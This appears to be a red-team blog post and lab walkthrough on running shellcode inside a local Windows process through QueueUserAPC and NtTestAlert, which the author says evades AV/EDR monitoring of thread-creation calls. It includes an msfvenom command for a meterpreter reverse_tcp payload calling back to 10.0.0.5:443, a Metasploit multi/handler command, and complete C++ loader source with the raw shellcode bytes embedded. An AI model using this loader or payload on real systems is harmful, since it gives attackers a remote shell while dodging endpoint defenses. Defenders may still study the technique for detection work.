---
layout: post
title: "shellcode execution in a local process with queueuserapc and nttestalert"
date: 2024-06-18
categories: code-injection-process-injection
tags: redteam, mitre, killchain, offensivesecurity, cpent, cpts, oscp, exploit
permalink: /code-injection-process-injection/
---

# Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert

This is a quick lab that shows how to execute shellcode within a local process by leveraging a Win32 API `QueueUserAPC` and an officially undocumented Native API `NtTestAlert`, which lands in kernel that calls `KiUserApcDispatcher` if the APC queue is not empty.

The advantage of this technique is that it does not rely on `CreateThread` or `CreateRemoteThread` API calls which are more popular and hence usually more scrutinized by SOCs and AV/EDR vendors.

Thanks to [Mumbai](https://twitter.com/win64\_) for pointing me to `NtTestAlert`.

## Execution

The flow of the technique is simple:

1. Allocate memory in the local process for the shellcode
2. Write shellcode to the newly allocated memory location
3. Queue an APC to the current thread
4. Issue `NtTestAlert`
5. Receive meterpreter session

Lets's generate the meterpreter shellcode first:

{% code title="attacker@kali" %}
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
```
{% endcode %}

![](<../../.gitbook/assets/Annotation 2019-05-27 191650.png>)

Short code that performs `NtTestAlert` function address resolution, memory allocation, shellcode writing to memory, APC queuing and `NtTestAlert` call:

![](<../../.gitbook/assets/Annotation 2019-05-27 192952.png>)

Now, set up a multi handler for catching the incoming meterpreter connection:

{% code title="attacker@kali" %}
```csharp
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
```
{% endcode %}

Below shows the technique in action, resulting in a meterpreter shell:

![](../../.gitbook/assets/apc-local.gif)

## Code

{% code title="local-apc.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

int main()
{
	unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x05\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";
	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	SIZE_T shellSize = sizeof(buf);
	LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL);
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	testAlert();

	return 0;
}
```
{% endcode %}

## Reference

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc" %}
@spotheplanet